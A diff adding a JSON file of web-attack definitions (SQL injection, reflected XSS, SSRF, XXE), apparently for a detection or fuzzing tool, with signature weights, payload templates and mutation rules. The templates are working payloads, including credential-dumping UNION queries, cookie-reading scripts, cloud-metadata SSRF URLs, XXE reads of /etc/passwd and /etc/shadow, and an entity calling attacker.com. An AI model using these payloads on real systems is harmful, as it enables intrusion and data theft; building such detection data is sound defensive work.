@@ -1,0 +1,162 @@
+[
+  {
+    "name": "SQL Injection - Authentication Bypass",
+    "category": "INJECTION",
+    "severity": "CRITICAL",
+    "description": "SQL injection attacks targeting authentication mechanisms to bypass login",
+    "feature_profile": {
+      "entropy_range": [0.55, 0.80],
+      "special_char_ratio": [0.15, 0.40],
+      "length_range": [0.1, 0.5]
+    },
+    "signature_patterns": [
+      {"pattern": "' OR '", "weight": 0.95},
+      {"pattern": "1=1", "weight": 0.9},
+      {"pattern": "admin'--", "weight": 0.95},
+      {"pattern": "' OR 1=1--", "weight": 0.95},
+      {"pattern": "OR ''='", "weight": 0.85}
+    ],
+    "templates": [
+      "' OR '1'='1",
+      "' OR '1'='1'--",
+      "' OR 1=1--",
+      "admin'--",
+      "' OR ''='",
+      "') OR ('1'='1",
+      "' OR 'x'='x",
+      "1' OR '1'='1",
+      "' OR 1=1#"
+    ],
+    "mutations": [
+      {"type": "case", "targets": ["OR", "AND", "SELECT"]},
+      {"type": "whitespace", "targets": ["/**/", " ", "+"]},
+      {"type": "encoding", "variants": ["url"]}
+    ],
+    "base_valence": 0.95
+  },
+  {
+    "name": "SQL Injection - Data Exfiltration",
+    "category": "INJECTION",
+    "severity": "CRITICAL",
+    "description": "SQL injection attacks using UNION SELECT to extract data from database",
+    "feature_profile": {
+      "entropy_range": [0.60, 0.85],
+      "special_char_ratio": [0.20, 0.45],
+      "length_range": [0.2, 0.7]
+    },
+    "signature_patterns": [
+      {"pattern": "UNION SELECT", "weight": 0.95},
+      {"pattern": "UNION ALL SELECT", "weight": 0.95},
+      {"pattern": "FROM information_schema", "weight": 0.9},
+      {"pattern": "FROM mysql.", "weight": 0.85},
+      {"pattern": "@@version", "weight": 0.8}
+    ],
+    "templates": [
+      "' UNION SELECT NULL--",
+      "' UNION SELECT username,password FROM users--",
+      "' UNION ALL SELECT 1,2,3--",
+      "' UNION SELECT table_name FROM information_schema.tables--",
+      "' UNION SELECT @@version--",
+      "1 UNION SELECT * FROM users WHERE '1'='1"
+    ],
+    "mutations": [
+      {"type": "case", "targets": ["UNION", "SELECT", "FROM", "WHERE", "NULL"]},
+      {"type": "whitespace", "targets": ["/**/", "+", "%20"]},
+      {"type": "encoding", "variants": ["url", "unicode"]}
+    ],
+    "base_valence": 0.95
+  },
+  {
+    "name": "Cross-Site Scripting - Reflected",
+    "category": "XSS",
+    "severity": "HIGH",
+    "description": "Reflected XSS attacks injecting scripts via URL parameters or form inputs",
+    "feature_profile": {
+      "entropy_range": [0.50, 0.75],
+      "special_char_ratio": [0.25, 0.50],
+      "length_range": [0.1, 0.4]
+    },
+    "signature_patterns": [
+      {"pattern": "<script>", "weight": 0.95},
+      {"pattern": "javascript:", "weight": 0.9},
+      {"pattern": "onerror=", "weight": 0.9},
+      {"pattern": "onload=", "weight": 0.85},
+      {"pattern": "onclick=", "weight": 0.8}
+    ],
+    "templates": [
+      "<script>alert('XSS')</script>",
+      "<script>alert(document.cookie)</script>",
+      "<img src=x onerror=alert('XSS')>",
+      "<svg onload=alert('XSS')>",
+      "javascript:alert('XSS')",
+      "<body onload=alert('XSS')>",
+      "<input onfocus=alert('XSS') autofocus>"
+    ],
+    "mutations": [
+      {"type": "case", "targets": ["script", "SCRIPT", "alert", "onerror"]},
+      {"type": "encoding", "variants": ["html_entity", "url", "unicode"]},
+      {"type": "substitution", "targets": ["alert"], "variants": ["prompt", "confirm"]}
+    ],
+    "base_valence": 0.90
+  },
+  {
+    "name": "Server-Side Request Forgery (SSRF)",
+    "category": "INJECTION",
+    "severity": "HIGH",
+    "description": "SSRF attacks attempting to access internal services or cloud metadata",
+    "feature_profile": {
+      "entropy_range": [0.45, 0.70],
+      "special_char_ratio": [0.15, 0.35],
+      "length_range": [0.2, 0.6]
+    },
+    "signature_patterns": [
+      {"pattern": "169.254.169.254", "weight": 0.95},
+      {"pattern": "localhost", "weight": 0.7},
+      {"pattern": "127.0.0.1", "weight": 0.75},
+      {"pattern": "file://", "weight": 0.85},
+      {"pattern": "gopher://", "weight": 0.9}
+    ],
+    "templates": [
+      "http://169.254.169.254/latest/meta-data/",
+      "http://localhost:8080/admin",
+      "http://127.0.0.1:22",
+      "file:///etc/passwd",
+      "http://[::1]/",
+      "http://0.0.0.0:8080",
+      "gopher://127.0.0.1:25/"
+    ],
+    "mutations": [
+      {"type": "encoding", "variants": ["url", "hex"]},
+      {"type": "substitution", "targets": ["127.0.0.1"], "variants": ["0x7f000001", "2130706433"]}
+    ],
+    "base_valence": 0.90
+  },
+  {
+    "name": "XML External Entity (XXE)",
+    "category": "INJECTION", 
+    "severity": "HIGH",
+    "description": "XXE attacks exploiting XML parsers to access files or internal services",
+    "feature_profile": {
+      "entropy_range": [0.50, 0.75],
+      "special_char_ratio": [0.20, 0.40],
+      "nesting_depth_range": [0.3, 0.7]
+    },
+    "signature_patterns": [
+      {"pattern": "<!ENTITY", "weight": 0.95},
+      {"pattern": "SYSTEM", "weight": 0.8},
+      {"pattern": "file://", "weight": 0.85},
+      {"pattern": "<!DOCTYPE", "weight": 0.7}
+    ],
+    "templates": [
+      "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
+      "<!ENTITY xxe SYSTEM \"http://attacker.com/\">",
+      "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/shadow\">]>",
+      "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>"
+    ],
+    "mutations": [
+      {"type": "case", "targets": ["ENTITY", "SYSTEM", "DOCTYPE"]},
+      {"type": "encoding", "variants": ["url"]}
+    ],
+    "base_valence": 0.90
+  }
+]
